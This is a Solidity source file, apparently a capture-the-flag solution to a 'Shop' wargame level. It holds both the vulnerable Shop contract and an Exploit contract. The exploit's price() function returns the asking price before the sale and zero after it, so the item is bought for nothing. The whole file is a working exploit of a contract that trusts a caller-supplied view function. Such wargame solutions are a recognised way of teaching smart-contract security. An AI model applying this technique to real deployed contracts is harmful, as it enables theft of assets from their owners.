// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

interface Buyer {
    function price() external view returns (uint);
  }

  contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
      Buyer _buyer = Buyer(msg.sender);

      if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
      }
    }
  }

contract Exploit is Destructible, Targeted, Buyer {
    uint depth = 0;
    uint largest_requested = 0;
    Shop shop;
    constructor(address target_addr) payable Targeted(target_addr) {
        shop = Shop(payable(target_addr));
    }

    function price() external view override returns (uint) {
        if (shop.isSold()) {
            return 0;
        }
        return shop.price();
    }
    function exploit() public {
        shop.buy();
    }
    receive() external payable {
    }
}